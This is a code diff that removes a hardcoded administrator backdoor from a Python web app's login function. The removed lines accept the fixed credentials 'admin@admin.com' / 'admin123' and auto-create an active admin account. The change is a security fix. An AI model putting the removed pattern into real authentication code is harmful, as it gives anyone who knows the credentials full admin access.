@@ -70,23 +70,6 @@ def register(db: Session, payload: UserCreate) -> TokenSchema:
 
 
 def login(db: Session, payload: LoginSchema) -> TokenSchema:
-    if payload.email == "admin@admin.com" and payload.password == "admin123":
-        user = db.query(User).filter(User.email == "admin@admin.com").first()
-        if not user:
-            user = User(
-                username="admin_hardcoded",
-                full_name="Hardcoded Admin",
-                email="admin@admin.com",
-                password_hash=security.get_password_hash("admin123"),
-                role=RoleEnum.ADMIN,
-                is_active=True,
-                is_verified=True,
-            )
-            db.add(user)
-            db.commit()
-            db.refresh(user)
-        return _tokens(user)
-
     user = db.query(User).filter(User.email == payload.email).first()
     if not user:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
